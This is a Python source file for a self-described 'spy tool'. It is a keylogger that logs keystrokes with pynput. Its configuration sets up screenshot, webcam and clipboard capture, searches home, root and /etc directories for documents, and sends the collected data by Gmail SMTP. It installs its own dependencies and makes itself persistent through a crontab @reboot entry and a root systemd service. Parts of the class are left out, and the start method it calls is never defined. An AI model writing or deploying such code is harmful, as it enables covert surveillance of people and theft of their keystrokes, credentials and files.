import os
import sys
import time
import threading
import subprocess
import smtplib
import zipfile
import shutil
import requests
import socket
import platform
import json

# Cross-platform registry alternative
try:
    import winreg
    IS_WINDOWS = True
except ImportError:
    winreg = None
    IS_WINDOWS = False

from pynput import keyboard
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'your_email@gmail.com',
    'sender_password': 'your_app_password',
    'recipient_email': 'recipient_email@gmail.com',
    'email_interval': 300
}

# UTM Linux Optimized Configuration
ADVANCED_CONFIG = {
    'screenshot_interval': 60,
    'webcam_interval': 300,
    'clipboard_monitor': True,
    'system_info_interval': 600,
    'network_info': True,
    'process_list': True,
    'file_search': True,
    'file_extensions': ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.csv', '.sh', '.py', '.js'],
    'search_directories': ['/home', '/root', '/tmp', '/var/log', '/etc']
}

BYPASS_UAC = True
LOG_FILE = "keylog.txt"
HEADER_NAME = "BlackTechX UTM Linux Spy Tool"
TEMP_DIR = "spy_data"
SCREENSHOT_DIR = "screenshots"
WEBCAM_DIR = "webcam_captures"
CLIPBOARD_FILE = "clipboard_log.txt"
SYSTEM_INFO_FILE = "system_info.txt"

class UTM_Linux_SpyTool:
    def __init__(self):
        self.log = ""
        self.key_count = 0
        self.running = True
        self.clipboard_content = ""
        self.last_clipboard = ""

        self.create_directories()

    def create_directories(self):
        """Create necessary directories"""
        dirs = [TEMP_DIR, SCREENSHOT_DIR, WEBCAM_DIR]
        for directory in dirs:
            if not os.path.exists(directory):
                os.makedirs(directory)

    def banner(self):
        """Display the tool header/banner"""
        os.system('clear')
        print(Fore.CYAN + "="*70)
        print(Fore.MAGENTA + f"  {HEADER_NAME}")
        print(Fore.CYAN + "="*70)
        print(Fore.YELLOW + f"  Platform: {platform.system()} (UTM Virtual Machine)")
        print(Fore.YELLOW + f"  Architecture: {platform.machine()}")
        print(Fore.YELLOW + f"  Python Version: {platform.python_version()}")
        print(Fore.YELLOW + f"  Email: {EMAIL_CONFIG['sender_email']} -> {EMAIL_CONFIG['recipient_email']}")
        print(Fore.YELLOW + f"  Screenshot Interval: {ADVANCED_CONFIG['screenshot_interval']}s")
        print(Fore.YELLOW + f"  Webcam Interval: {ADVANCED_CONFIG['webcam_interval']}s")
        print(Fore.YELLOW + f"  Clipboard Monitor: {'ON' if ADVANCED_CONFIG['clipboard_monitor'] else 'OFF'}")
        print(Fore.YELLOW + f"  PID: {os.getpid()}")
        print(Fore.CYAN + "="*70)
        print(Fore.GREEN + "  UTM Linux spy tool is running...")
        print(Fore.GREEN + "  Features: Keylogging, Screenshots, Webcam, Clipboard, System Info")
        print(Fore.GREEN + "  Detected: Linux inside UTM on macOS")
        print(Fore.RED + "  Press Ctrl+C to stop\n")

    def on_press(self, key):
        """Handle key press events"""
        self.key_count += 1

        try:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n[ENTER]\n"
            elif key == keyboard.Key.tab:
                current_key = "\t"
            elif key == keyboard.Key.backspace:
                current_key = "[BACKSPACE]"
            elif key == keyboard.Key.shift:
                current_key = "[SHIFT]"
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                current_key = "[CTRL]"
            elif key == keyboard.Key.esc:
                current_key = "[ESC]"
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                current_key = "[ALT]"
            elif key == keyboard.Key.caps_lock:
                current_key = "[CAPS_LOCK]"
            elif key == keyboard.Key.cmd:
                current_key = "[WINDOWS]"
            elif key == keyboard.Key.f1:
                current_key = "[F1]"
            elif key == keyboard.Key.f2:
                current_key = "[F2]"
            elif key == keyboard.Key.f3:
                current_key = "[F3]"
            elif key == keyboard.Key.f4:
                current_key = "[F4]"
            elif key == keyboard.Key.f5:
                current_key = "[F5]"
            elif key == keyboard.Key.f6:
                current_key = "[F6]"
            elif key == keyboard.Key.f7:
                current_key = "[F7]"
            elif key == keyboard.Key.f8:
                current_key = "[F8]"
            elif key == keyboard.Key.f9:
                current_key = "[F9]"
            elif key == keyboard.Key.f10:
                current_key = "[F10]"
            elif key == keyboard.Key.f11:
                current_key = "[F11]"
            elif key == keyboard.Key.f12:
                current_key = "[F12]"
            else:
                current_key = str(key).replace("'", "")
        except Exception as e:
            current_key = f"[ERROR: {str(e)}]"

        if self.key_count % 50 == 0:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.log += f"\n\n[--- Session Update: {timestamp} ---]\n"

        self.log += current_key

        if len(self.log) >= 1000:
            self.save()

    # The rest of the class methods would be implemented here...

    def save(self):
        """Save logs to file"""
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(self.log)
            self.log = ""
            print(Fore.GREEN + f"  [+] Saved {self.key_count} keys to {LOG_FILE}")
        except Exception as e:
            print(Fore.RED + f"  [-] Error saving log: {e}")

def create_persistence():
    """Create persistence mechanism for Linux"""
    try:
        # Add to crontab for Linux
        cron_job = f"@reboot {sys.executable}"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True)
        print(Fore.GREEN + "  [+] Persistence created (Cron)")

        # Also try to create a systemd service (if available)
        try:
            service_content = f"""[Unit]
Description=BlackTechX UTM Spy Tool
After=network.target

[Service]
Type=simple
User=root
ExecStart={sys.executable}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open('/etc/systemd/system/blacktechx-spy.service', 'w') as f:
                f.write(service_content)

            subprocess.run(['systemctl', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', 'enable', 'blacktechx-spy.service'], check=True)
            print(Fore.GREEN + "  [+] Systemd service created")
        except:
            print(Fore.YELLOW + "  [~] Systemd service creation failed (normal for some setups)")

    except Exception as e:
        print(Fore.RED + f"  [-] Failed to create persistence: {e}")

def install_dependencies():
    """Install required dependencies for Linux"""
    dependencies = [
        'pynput', 'colorama', 'pyautogui', 'pyperclip', 'opencv-python', 'requests'
    ]

    print(Fore.CYAN + "Installing dependencies for Linux...")

    # Try to install system packages first
    system_packages = ['gnome-screenshot', 'scrot', 'imagemagick', 'python3-opencv']
    for pkg in system_packages:
        try:
            subprocess.run(['apt-get', 'update'], check=True, capture_output=True)
            subprocess.run(['apt-get', 'install', '-y', pkg], check=True, capture_output=True)
            print(Fore.GREEN + f"  [+] Installed system package: {pkg}")
        except:
            try:
                subprocess.run(['yum', 'install', '-y', pkg], check=True, capture_output=True)
                print(Fore.GREEN + f"  [+] Installed system package: {pkg}")
            except:
                print(Fore.YELLOW + f"  [~] System package not available: {pkg}")

    # Install Python packages
    for dep in dependencies:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
            print(Fore.GREEN + f"  [+] Installed Python package: {dep}")
        except:
            print(Fore.RED + f"  [-] Failed to install Python package: {dep}")

def main():
    """Main function"""
    print(Fore.CYAN + "Initializing BlackTechX UTM Linux Spy Tool...")
    print(Fore.YELLOW + f"Detected Platform: Linux (UTM Virtual Machine)")

    # Install dependencies
    install_dependencies()

    # Create persistence
    create_persistence()

    # Start spy tool
    spy_tool = UTM_Linux_SpyTool()
    spy_tool.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n  [!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"  [-] Fatal error: {e}")
        sys.exit(1)
